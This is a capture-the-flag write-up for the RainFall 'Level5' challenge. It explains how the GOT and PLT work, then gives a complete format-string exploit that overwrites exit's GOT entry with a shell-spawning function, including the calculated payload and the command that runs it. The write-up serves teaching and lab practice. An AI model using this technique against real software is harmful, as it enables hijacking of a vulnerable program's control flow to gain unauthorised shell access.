# Level5
Level5 introduce GOT and PLT (Global Offset Table and Procedure Linkage Table) 

# Tools
**Cutter**: free and open source reverse-engineering software

# GOT/PLT
A little explanation around the Global Offset Table and the Procedure Linkage Table. 

When using dynamic libraries (libraries that aren't directly included in the code of the program), our computer needs to find the addresses of the different functions.

However, these addresses aren't the same all the time, they often even change at each execution.

Thus, smart programrs have invented the PLT / GOT system. Basically, it's caching for function addresses.

When a program that uses functions from a dynamic library is compiled, it doesn't know the addresses of the external functions yet.

Thus, it creates a "trampoline" function:
```x86
void exit(int status);
0x080483d0      jmp     dword [exit] ; 0x8049838
0x080483d6      push    0x28       ; '(' ; 40
0x080483db      jmp     section..plt
```
What this code do is pretty simple. Basically, it checks if the address of the function has already been retrieved, and if not, it jumps to a specific section of the code to retrieve it.
So we have two cases:
1. The program knows what's the REAL address of the function, and calls it
2. The program doesn't know yte what's the real address of the function, and retrieves it before calling it

The latter uses a very specific funciton, `ld.so`, which is the dynamic linker / loader function. What this function does is that it will retrieve the real address of the function in the dynamic library, and write it inside of a table for easier access (option 1). This table is the Global Offset Table, and the Procedure Linkage Table refers to that process of, if the address of the function isn't found, find it with the `ld.so` system.
Each "trampoline" function is also called a "PLT entry".

# Walkthrough

Upon looking at the code with dogbolt, we see two interesting functions:

```c
int o()
{
    system("/bin/sh");
    _exit(1); /* do not return */
}

void n()
{
    char v0;  // [bp-0x20c]

    fgets(&v0, 0x200, __bss_start);
    printf(&v0);
    exit(1); /* do not return */
}
```

Function `o` is definetely interesting. It's worth noting that both functons to do return anything, and will eventually call the `exit` function from `libc`. 

The `libc` is dynamically linked to the binary, and thus using techniques such as printf buffer manipulation, we can overwrite specific parts of the memory to alter Global Offset Table entries. 

Getting the address of function `o`:
```
objdump -t level5
...
080484a4 g     F .text	0000001e              o
...
```

Getting the address of the `exit` function from `libc`:
```
level5@RainFall:~$ objdump -TR level5
...
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
...
08049838 R_386_JUMP_SLOT   exit
...
```

The value stored by the GOT, value retrieved by the `ld.so` function (dynamic linker / loader).


Find the offset, with trial and error:
```
level5@RainFall:~$ ./level5 <<< $(python -c 'print "AAAA" + "%4$x"')
AAAA41414141
```
Thus, we know that the 4th element is the beginning of the buffer for `printf`.
What we want to do is to overwrite the content inside of `08049838` (exit's address) by `o`'s address, `080484a4`. 

`080484a4` is a 4-bytes value, and it's safer to write it in 2 times instead of printing the 4-bytes directly, as addresses can be misaligned, which would break our exploit.
`0x0804` = `2052`
`0x84a4` = `33956`

Again, because the system is little-endian, which means that the least significant byte of a word is stored at the smallest memory location, we to write `33956` first and then `2052`

The addresses we want to write at are: `08049838` and `0804983a`:
`"\x3a\x98\x04\x08" + "\x38\x98\x04\x08"`
We write `2052` to `0804983a` and `33956` to `08049838`, starting at argument `4` and writing on only 2-bytes at a time `hn`:
`"\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%(2052 - 8)d" + "%4\$hn" + "%(33956 - 2052)d" + "%5\$hn"`
Giving payload:
`"\x3a\x98\x04\x08\x38\x98\x04\x08%2044d%4$hn%31904d%5$hn"`

Execute the attack:
```bash
python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044d%4$hn%31904d%5$hn"' > attack.txt; cat attack.txt - | ./level5
```

# Resources
